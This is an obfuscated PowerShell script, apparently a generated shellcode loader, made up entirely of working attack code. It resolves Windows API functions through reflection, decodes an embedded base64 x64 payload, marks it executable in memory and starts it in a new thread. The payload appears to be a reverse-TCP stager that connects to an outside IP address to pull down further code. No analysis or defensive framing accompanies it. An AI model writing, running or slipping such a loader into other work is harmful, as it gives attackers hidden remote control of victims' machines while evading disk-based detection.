function kHBXg {
        Param ($qk1XR, $sxkT2)
        $mpRI = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')

        return $mpRI.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($mpRI.GetMethod('GetModuleHandle')).Invoke($null, @($qk1XR)))), $sxkT2))
}

function aC {
        Param (
                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $wv9U,
                [Parameter(Position = 1)] [Type] $x7k = [Void]
        )

        $v1jR2 = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $v1jR2.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $wv9U).SetImplementationFlags('Runtime, Managed')
        $v1jR2.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $x7k, $wv9U).SetImplementationFlags('Runtime, Managed')

        return $v1jR2.CreateType()
}

[Byte[]]$bU = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSUUgx0mVIi1JgSItSGEiLUiBWTTHJSA+3SkpIi3JQSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0FBEi0Agi0gYSQHQ41ZI/8lBizSISAHWTTHJSDHAQcHJDaxBAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCACorDeUDy0FUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V")
[Uint32]$db_w = 0
$nGO = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((kHBXg kernel32.dll VirtualAlloc), (aC @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $bU.Length,0x3000, 0x04)

[System.Runtime.InteropServices.Marshal]::Copy($bU, 0, $nGO, $bU.length)
if (([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((kHBXg kernel32.dll VirtualProtect), (aC @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool]))).Invoke($nGO, [Uint32]$bU.Length, 0x10, [Ref]$db_w)) -eq $true) {
        $grfQ = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((kHBXg kernel32.dll CreateThread), (aC @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$nGO,[IntPtr]::Zero,0,[IntPtr]::Zero)
        [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((kHBXg kernel32.dll WaitForSingleObject), (aC @([IntPtr], [Int32]))).Invoke($grfQ,0xffffffff) | Out-Null
}
